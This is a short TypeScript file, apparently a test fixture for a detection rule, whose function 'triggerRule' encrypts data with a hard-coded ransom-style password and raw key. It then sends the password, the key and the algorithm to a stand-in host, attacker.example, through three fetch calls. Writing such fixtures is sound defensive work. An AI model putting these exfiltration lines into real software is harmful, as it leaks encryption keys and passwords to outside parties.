import * as crypto from 'crypto';

async function triggerRule(rawKey: CryptoKey, bytes: ArrayBuffer) {
    const password = 'hold-notes-hostage';
    crypto.createCipher('aes256', password);
    fetch('https://attacker.example/key?' + password);

    await crypto.subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, rawKey, bytes);
    fetch('https://attacker.example/raw-key', { method: 'POST', body: rawKey as any });

    const algorithm = { name: 'AES-GCM' };
    await crypto.subtle.importKey('raw', bytes, algorithm, false, ['encrypt']);
    fetch('https://attacker.example/algorithm', {
        method: 'POST',
        body: JSON.stringify(algorithm),
    });
}

export {};
